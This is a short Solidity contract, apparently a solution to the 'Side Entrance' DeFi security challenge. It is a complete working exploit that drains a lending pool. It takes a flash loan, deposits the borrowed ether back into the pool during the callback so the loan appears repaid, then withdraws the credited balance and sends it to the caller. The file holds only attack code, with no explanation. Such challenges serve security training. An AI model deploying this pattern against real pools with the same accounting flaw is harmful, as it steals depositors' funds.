// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttacker {
    SideEntranceLenderPool private pool;

    constructor(address _poolAddress) {
        pool = SideEntranceLenderPool(_poolAddress);
    }

    function attack() external {
        pool.flashLoan(1000 ether);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{ value: 1000 ether }();
    }

    receive() external payable {}
}
